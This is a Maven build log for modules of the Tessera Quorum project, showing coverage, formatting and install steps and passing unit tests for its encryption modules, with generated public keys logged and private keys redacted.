[INFO] --- maven-enforcer-plugin:3.0.0-M2:enforce (enforce-versions) @ tests ---
[INFO] Adding ignore: module-info
[INFO] Adding ignore: META-INF/versions/*/module-info
[INFO] Adding ignore: com.google.*
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (default) @ tests ---
[INFO] argLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/tests/target/jacoco.exec
[INFO] 
[INFO] --- googleformatter-maven-plugin:1.7.3:format (reformat-sources) @ tests ---
[INFO] Project packaging is POM, skipping...
[INFO] 
[INFO] --- maven-checkstyle-plugin:3.0.0:check (verify-style) @ tests ---
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (report) @ tests ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:check (check) @ tests ---
[INFO] Skipping JaCoCo execution due to missing execution data file:/tessera/tests/target/jacoco.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (pre-integration-test) @ tests ---
[INFO] failsafeArgLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/tests/target/jacoco-it.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (post-integration-test) @ tests ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- editorconfig-maven-plugin:0.0.10:check (check) @ tests ---
[INFO] Checked 896 files
[INFO] 
[INFO] --- maven-install-plugin:2.4:install (default-install) @ tests ---
[INFO] Installing /tessera/tests/pom.xml to /root/.m2/repository/com/jpmorgan/quorum/tests/0.11-SNAPSHOT/tests-0.11-SNAPSHOT.pom
[INFO] 
[INFO] -------------------< com.jpmorgan.quorum:test-util >--------------------
[INFO] Building test-util 0.11-SNAPSHOT                                  [5/64]
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-enforcer-plugin:3.0.0-M2:enforce (enforce-versions) @ test-util ---
[INFO] Checking for vulnerabilities; 19 artifacts
[INFO] Exclude coordinates: []
[INFO] Exclude vulnerability identifiers: [33fe5e62-2998-4820-aebc-68e348539b22]
[INFO] CVSS-score threshold: 0.0
[INFO] Adding ignore: module-info
[INFO] Adding ignore: META-INF/versions/*/module-info
[INFO] Adding ignore: com.google.*
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (default) @ test-util ---
[INFO] argLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/tests/test-util/target/jacoco.exec
[INFO] 
[INFO] --- googleformatter-maven-plugin:1.7.3:format (reformat-sources) @ test-util ---
[INFO] Found 1 uncompiled/modified files in /tessera/tests/test-util/src/main/java to reformat.
[INFO] Directory /tessera/tests/test-util/src/test/java does not exist, skipping file collection.
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'rev-parse' '--show-prefix'
[INFO] Working directory: /tessera
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'status' '--porcelain' '.'
[INFO] Working directory: /tessera
[WARNING] Ignoring unrecognized line: ?? config/newPasses.txt
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ test-util ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /tessera/tests/test-util/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ test-util ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- maven-checkstyle-plugin:3.0.0:check (verify-style) @ test-util ---
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ test-util ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /tessera/tests/test-util/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ test-util ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-surefire-plugin:3.0.0-M3:test (default-test) @ test-util ---
[INFO] No tests to run.
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (report) @ test-util ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- maven-jar-plugin:2.4:jar (default-jar) @ test-util ---
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:check (check) @ test-util ---
[INFO] Skipping JaCoCo execution due to missing execution data file:/tessera/tests/test-util/target/jacoco.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (pre-integration-test) @ test-util ---
[INFO] failsafeArgLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/tests/test-util/target/jacoco-it.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (post-integration-test) @ test-util ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- editorconfig-maven-plugin:0.0.10:check (check) @ test-util ---
[INFO] Checked 896 files
[INFO] 
[INFO] --- maven-install-plugin:2.4:install (default-install) @ test-util ---
[INFO] Installing /tessera/tests/test-util/target/test-util-0.11-SNAPSHOT.jar to /root/.m2/repository/com/jpmorgan/quorum/test-util/0.11-SNAPSHOT/test-util-0.11-SNAPSHOT.jar
[INFO] Installing /tessera/tests/test-util/pom.xml to /root/.m2/repository/com/jpmorgan/quorum/test-util/0.11-SNAPSHOT/test-util-0.11-SNAPSHOT.pom
[INFO] 
[INFO] ----------------< com.jpmorgan.quorum:service-locator >-----------------
[INFO] Building service-locator 0.11-SNAPSHOT                            [6/64]
[INFO] --------------------------------[ pom ]---------------------------------
[INFO] 
[INFO] --- maven-enforcer-plugin:3.0.0-M2:enforce (enforce-versions) @ service-locator ---
[INFO] Adding ignore: module-info
[INFO] Adding ignore: META-INF/versions/*/module-info
[INFO] Adding ignore: com.google.*
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (default) @ service-locator ---
[INFO] argLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/service-locator/target/jacoco.exec
[INFO] 
[INFO] --- googleformatter-maven-plugin:1.7.3:format (reformat-sources) @ service-locator ---
[INFO] Project packaging is POM, skipping...
[INFO] 
[INFO] --- maven-checkstyle-plugin:3.0.0:check (verify-style) @ service-locator ---
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (report) @ service-locator ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:check (check) @ service-locator ---
[INFO] Skipping JaCoCo execution due to missing execution data file:/tessera/service-locator/target/jacoco.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (pre-integration-test) @ service-locator ---
[INFO] failsafeArgLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/service-locator/target/jacoco-it.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (post-integration-test) @ service-locator ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- editorconfig-maven-plugin:0.0.10:check (check) @ service-locator ---
[INFO] Checked 896 files
[INFO] 
[INFO] --- maven-install-plugin:2.4:install (default-install) @ service-locator ---
[INFO] Installing /tessera/service-locator/pom.xml to /root/.m2/repository/com/jpmorgan/quorum/service-locator/0.11-SNAPSHOT/service-locator-0.11-SNAPSHOT.pom
[INFO] 
[INFO] --------------< com.jpmorgan.quorum:service-locator-api >---------------
[INFO] Building service-locator-api 0.11-SNAPSHOT                        [7/64]
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-enforcer-plugin:3.0.0-M2:enforce (enforce-versions) @ service-locator-api ---
[INFO] Checking for vulnerabilities; 19 artifacts
[INFO] Exclude coordinates: []
[INFO] Exclude vulnerability identifiers: [33fe5e62-2998-4820-aebc-68e348539b22]
[INFO] CVSS-score threshold: 0.0
[INFO] Adding ignore: module-info
[INFO] Adding ignore: META-INF/versions/*/module-info
[INFO] Adding ignore: com.google.*
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (default) @ service-locator-api ---
[INFO] argLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/service-locator/service-locator-api/target/jacoco.exec
[INFO] 
[INFO] --- googleformatter-maven-plugin:1.7.3:format (reformat-sources) @ service-locator-api ---
[INFO] Found 1 uncompiled/modified files in /tessera/service-locator/service-locator-api/src/main/java to reformat.
[INFO] Directory /tessera/service-locator/service-locator-api/src/test/java does not exist, skipping file collection.
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'rev-parse' '--show-prefix'
[INFO] Working directory: /tessera
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'status' '--porcelain' '.'
[INFO] Working directory: /tessera
[WARNING] Ignoring unrecognized line: ?? config/newPasses.txt
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ service-locator-api ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /tessera/service-locator/service-locator-api/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ service-locator-api ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- maven-checkstyle-plugin:3.0.0:check (verify-style) @ service-locator-api ---
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ service-locator-api ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /tessera/service-locator/service-locator-api/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ service-locator-api ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-surefire-plugin:3.0.0-M3:test (default-test) @ service-locator-api ---
[INFO] No tests to run.
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (report) @ service-locator-api ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- maven-jar-plugin:2.4:jar (default-jar) @ service-locator-api ---
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:check (check) @ service-locator-api ---
[INFO] Skipping JaCoCo execution due to missing execution data file:/tessera/service-locator/service-locator-api/target/jacoco.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (pre-integration-test) @ service-locator-api ---
[INFO] failsafeArgLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/service-locator/service-locator-api/target/jacoco-it.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (post-integration-test) @ service-locator-api ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- editorconfig-maven-plugin:0.0.10:check (check) @ service-locator-api ---
[INFO] Checked 896 files
[INFO] 
[INFO] --- maven-install-plugin:2.4:install (default-install) @ service-locator-api ---
[INFO] Installing /tessera/service-locator/service-locator-api/target/service-locator-api-0.11-SNAPSHOT.jar to /root/.m2/repository/com/jpmorgan/quorum/service-locator-api/0.11-SNAPSHOT/service-locator-api-0.11-SNAPSHOT.jar
[INFO] Installing /tessera/service-locator/service-locator-api/pom.xml to /root/.m2/repository/com/jpmorgan/quorum/service-locator-api/0.11-SNAPSHOT/service-locator-api-0.11-SNAPSHOT.pom
[INFO] 
[INFO] -------------------< com.jpmorgan.quorum:encryption >-------------------
[INFO] Building encryption 0.11-SNAPSHOT                                 [8/64]
[INFO] --------------------------------[ pom ]---------------------------------
[INFO] 
[INFO] --- maven-enforcer-plugin:3.0.0-M2:enforce (enforce-versions) @ encryption ---
[INFO] Adding ignore: module-info
[INFO] Adding ignore: META-INF/versions/*/module-info
[INFO] Adding ignore: com.google.*
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (default) @ encryption ---
[INFO] argLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/encryption/target/jacoco.exec
[INFO] 
[INFO] --- googleformatter-maven-plugin:1.7.3:format (reformat-sources) @ encryption ---
[INFO] Project packaging is POM, skipping...
[INFO] 
[INFO] --- maven-checkstyle-plugin:3.0.0:check (verify-style) @ encryption ---
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (report) @ encryption ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:check (check) @ encryption ---
[INFO] Skipping JaCoCo execution due to missing execution data file:/tessera/encryption/target/jacoco.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (pre-integration-test) @ encryption ---
[INFO] failsafeArgLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/encryption/target/jacoco-it.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (post-integration-test) @ encryption ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- editorconfig-maven-plugin:0.0.10:check (check) @ encryption ---
[INFO] Checked 896 files
[INFO] 
[INFO] --- maven-install-plugin:2.4:install (default-install) @ encryption ---
[INFO] Installing /tessera/encryption/pom.xml to /root/.m2/repository/com/jpmorgan/quorum/encryption/0.11-SNAPSHOT/encryption-0.11-SNAPSHOT.pom
[INFO] 
[INFO] -----------------< com.jpmorgan.quorum:encryption-api >-----------------
[INFO] Building encryption-api 0.11-SNAPSHOT                             [9/64]
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-enforcer-plugin:3.0.0-M2:enforce (enforce-versions) @ encryption-api ---
[INFO] Checking for vulnerabilities; 22 artifacts
[INFO] Exclude coordinates: []
[INFO] Exclude vulnerability identifiers: [33fe5e62-2998-4820-aebc-68e348539b22]
[INFO] CVSS-score threshold: 0.0
[INFO] Adding ignore: module-info
[INFO] Adding ignore: META-INF/versions/*/module-info
[INFO] Adding ignore: com.google.*
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (default) @ encryption-api ---
[INFO] argLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/encryption/encryption-api/target/jacoco.exec
[INFO] 
[INFO] --- googleformatter-maven-plugin:1.7.3:format (reformat-sources) @ encryption-api ---
[INFO] Found 19 uncompiled/modified files in /tessera/encryption/encryption-api/src/main/java to reformat.
[INFO] Found 10 uncompiled/modified files in /tessera/encryption/encryption-api/src/test/java to reformat.
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'rev-parse' '--show-prefix'
[INFO] Working directory: /tessera
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'status' '--porcelain' '.'
[INFO] Working directory: /tessera
[WARNING] Ignoring unrecognized line: ?? config/newPasses.txt
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ encryption-api ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /tessera/encryption/encryption-api/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ encryption-api ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- maven-checkstyle-plugin:3.0.0:check (verify-style) @ encryption-api ---
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ encryption-api ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ encryption-api ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- maven-surefire-plugin:3.0.0-M3:test (default-test) @ encryption-api ---
[INFO] 
[INFO] -------------------------------------------------------
[INFO]  T E S T S
[INFO] -------------------------------------------------------
[INFO] Running com.quorum.tessera.nacl.NaclFacadeFactoryTest
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.208 s - in com.quorum.tessera.nacl.NaclFacadeFactoryTest
[INFO] Running com.quorum.tessera.nacl.NaclFacadeTest
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.68 s - in com.quorum.tessera.nacl.NaclFacadeTest
[INFO] Running com.quorum.tessera.nacl.NonceTest
16:26:29.979 [main] INFO com.openpojo.log.LoggerFactory - Logging subsystem initialized to [com.openpojo.log.impl.SLF4JLogger]
16:26:29.983 [main] INFO com.openpojo.reflection.coverage.service.PojoCoverageFilterServiceFactory - Jacoco detected, auto-configuring OpenPojo to ignore its structures.
16:26:30.061 [main] DEBUG com.openpojo.validation.test.impl.GetterTester - Testing Field [PojoFieldImpl [field=private final byte[] com.quorum.tessera.nacl.Nonce.nonceBytes, fieldGetter=PojoMethodImpl [method=getNonceBytes args=[] return=class [B], fieldSetter=null]] with value [[B@3855b27e]
16:26:30.067 [main] INFO com.openpojo.validation.affirm.Affirmation - Dynamically setting affirmation implementation = [com.openpojo.validation.affirm.JUnitAssertAffirmation [@33e4068: ]]
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.847 s - in com.quorum.tessera.nacl.NonceTest
[INFO] Running com.quorum.tessera.nacl.NaclExceptionTest
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s - in com.quorum.tessera.nacl.NaclExceptionTest
[INFO] Running com.quorum.tessera.nacl.KeyExceptionTest
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s - in com.quorum.tessera.nacl.KeyExceptionTest
[INFO] Running com.quorum.tessera.encryption.KeyPairTest
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.068 s - in com.quorum.tessera.encryption.KeyPairTest
[INFO] Running com.quorum.tessera.encryption.KeyManagerTest
16:26:30.153 [main] DEBUG com.quorum.tessera.encryption.KeyManagerImpl - Attempting to find public key for the private key PrivateKey[cHJpdmF0ZUtleQ==]
16:26:30.160 [main] DEBUG com.quorum.tessera.encryption.KeyManagerImpl - Found public key PublicKey[cHVibGljS2V5] for private key PrivateKey[cHJpdmF0ZUtleQ==]
16:26:30.161 [main] DEBUG com.quorum.tessera.encryption.KeyManagerImpl - Attempting to find private key for the public key PublicKey[cHVibGljS2V5]
16:26:30.162 [main] DEBUG com.quorum.tessera.encryption.KeyManagerImpl - Found private key PrivateKey[cHJpdmF0ZUtleQ==] for public key PublicKey[cHVibGljS2V5]
16:26:30.163 [main] DEBUG com.quorum.tessera.encryption.KeyManagerImpl - Attempting to find public key for the private key PrivateKey[dW5rbm93bktleQ==]
16:26:30.178 [main] DEBUG com.quorum.tessera.encryption.KeyManagerImpl - Attempting to find private key for the public key PublicKey[dW5rbm93bktleQ==]
[INFO] Tests run: 8, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.035 s - in com.quorum.tessera.encryption.KeyManagerTest
[INFO] Running com.quorum.tessera.encryption.KeyTest
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.009 s - in com.quorum.tessera.encryption.KeyTest
[INFO] 
[INFO] Results:
[INFO] 
[INFO] Tests run: 27, Failures: 0, Errors: 0, Skipped: 0
[INFO] 
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (report) @ encryption-api ---
[INFO] Loading execution data file /tessera/encryption/encryption-api/target/jacoco.exec
[INFO] Analyzed bundle 'encryption-api' with 17 classes
[INFO] 
[INFO] --- maven-jar-plugin:2.4:jar (default-jar) @ encryption-api ---
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:check (check) @ encryption-api ---
[INFO] Loading execution data file /tessera/encryption/encryption-api/target/jacoco.exec
[INFO] Analyzed bundle 'encryption-api' with 17 classes
[INFO] All coverage checks have been met.
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (pre-integration-test) @ encryption-api ---
[INFO] failsafeArgLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/encryption/encryption-api/target/jacoco-it.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (post-integration-test) @ encryption-api ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- editorconfig-maven-plugin:0.0.10:check (check) @ encryption-api ---
[INFO] Checked 896 files
[INFO] 
[INFO] --- maven-install-plugin:2.4:install (default-install) @ encryption-api ---
[INFO] Installing /tessera/encryption/encryption-api/target/encryption-api-0.11-SNAPSHOT.jar to /root/.m2/repository/com/jpmorgan/quorum/encryption-api/0.11-SNAPSHOT/encryption-api-0.11-SNAPSHOT.jar
[INFO] Installing /tessera/encryption/encryption-api/pom.xml to /root/.m2/repository/com/jpmorgan/quorum/encryption-api/0.11-SNAPSHOT/encryption-api-0.11-SNAPSHOT.pom
[INFO] 
[INFO] ----------------< com.jpmorgan.quorum:encryption-jnacl >----------------
[INFO] Building encryption-jnacl 0.11-SNAPSHOT                          [10/64]
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-enforcer-plugin:3.0.0-M2:enforce (enforce-versions) @ encryption-jnacl ---
[INFO] Checking for vulnerabilities; 22 artifacts
[INFO] Exclude coordinates: []
[INFO] Exclude vulnerability identifiers: [33fe5e62-2998-4820-aebc-68e348539b22]
[INFO] CVSS-score threshold: 0.0
[INFO] Adding ignore: module-info
[INFO] Adding ignore: META-INF/versions/*/module-info
[INFO] Adding ignore: com.google.*
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (default) @ encryption-jnacl ---
[INFO] argLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/encryption/encryption-jnacl/target/jacoco.exec
[INFO] 
[INFO] --- googleformatter-maven-plugin:1.7.3:format (reformat-sources) @ encryption-jnacl ---
[INFO] Found 4 uncompiled/modified files in /tessera/encryption/encryption-jnacl/src/main/java to reformat.
[INFO] Found 4 uncompiled/modified files in /tessera/encryption/encryption-jnacl/src/test/java to reformat.
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'rev-parse' '--show-prefix'
[INFO] Working directory: /tessera
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'status' '--porcelain' '.'
[INFO] Working directory: /tessera
[WARNING] Ignoring unrecognized line: ?? config/newPasses.txt
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ encryption-jnacl ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ encryption-jnacl ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- maven-checkstyle-plugin:3.0.0:check (verify-style) @ encryption-jnacl ---
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ encryption-jnacl ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ encryption-jnacl ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- maven-surefire-plugin:3.0.0-M3:test (default-test) @ encryption-jnacl ---
[INFO] 
[INFO] -------------------------------------------------------
[INFO]  T E S T S
[INFO] -------------------------------------------------------
[INFO] Running com.quorum.tessera.nacl.jnacl.JnaclFactoryTest
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.501 s - in com.quorum.tessera.nacl.jnacl.JnaclFactoryTest
[INFO] Running com.quorum.tessera.nacl.jnacl.JnaclSecretBoxTest
[INFO] Tests run: 12, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.16 s - in com.quorum.tessera.nacl.jnacl.JnaclSecretBoxTest
[INFO] Running com.quorum.tessera.nacl.jnacl.JnaclTest
16:26:33.618 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.641 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[aGhTFpwAb6874L8BJgleT5uBu/OuFeEjICBcJAI8SU8=] and private key REDACTED
16:26:33.706 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.711 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[50M6l3L/Do6c4VYw+FFzmFgtzUdHdXB+yYy8MDwhdU8=] and private key REDACTED
16:26:33.717 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.721 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[sdH+lq8ZT+/5o8//1j9bOtjCUS0gqe3DGvIb2AgN5js=] and private key REDACTED
16:26:33.731 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.735 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[c5zNckhNCwEOKrSZb1NuNtjWkq4rKpNMWNZjh9Syrnk=] and private key REDACTED
16:26:33.740 [main] WARN  com.quorum.tessera.nacl.jnacl.Jnacl - Could not open sealed payload using shared key SharedKey[3PUSXeGKIaISNqJuYeNvUth7KkXr0+HR0Bdh0fOBxWc=]
16:26:33.742 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.746 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[oCJk41RlK+r62noG095jxDSN/pgi/JWOdqcUW7WlMWA=] and private key REDACTED
16:26:33.751 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.755 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[nsGosmeRChmx+ctH8eSa89yKEsmtrKHNGwsfL8nFmxE=] and private key REDACTED
16:26:33.760 [main] WARN  com.quorum.tessera.nacl.jnacl.Jnacl - Could not create sealed payload using shared key SharedKey[i4A4kCJLTsJ7pr48CsklofKxGj/hzy1n3xE3pJJ5J8E=]
16:26:33.761 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.765 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[5lyNQXi2aSwOPnm6zmk2qTtGXTNALI1SRYOAnWXkwkk=] and private key REDACTED
16:26:33.774 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.779 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[S+rRsBWZvKAtXul2HAGb6/3x40pnAvNEpuneJ5fwDVg=] and private key REDACTED
16:26:33.783 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.784 [main] WARN  com.quorum.tessera.nacl.jnacl.Jnacl - Unable to generate a new keypair!
16:26:33.784 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.788 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[lvO91ep9dx7SkCwrUGz5/UeD2fbGPV0+449FIH3FGyY=] and private key REDACTED
16:26:33.794 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.798 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[Nrb18xqeru3AnD2xJiFLwHpa/V57jTXHS3wJ7Cnssi8=] and private key REDACTED
16:26:33.803 [main] WARN  com.quorum.tessera.nacl.jnacl.Jnacl - Could not compute the shared key for pub PublicKey[Nrb18xqeru3AnD2xJiFLwHpa/V57jTXHS3wJ7Cnssi8=] and priv REDACTED
16:26:33.804 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.808 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[Qkh9p2Xy+KYWW9Bnjv+S3ZASkRO3COl/ER5TNUip8GA=] and private key REDACTED
16:26:33.814 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.819 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[XnvzIVXxhhrwzhJlvNV3NR8vI0RW55Ipz83d01YpLhc=] and private key REDACTED
16:26:33.823 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.823 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=] and private key REDACTED
16:26:33.824 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
16:26:33.828 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[/XcQXeK21i24G/snmx9pbVyuKGP3BehkbZCSgHNo438=] and private key REDACTED
16:26:33.833 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generating new keypair...
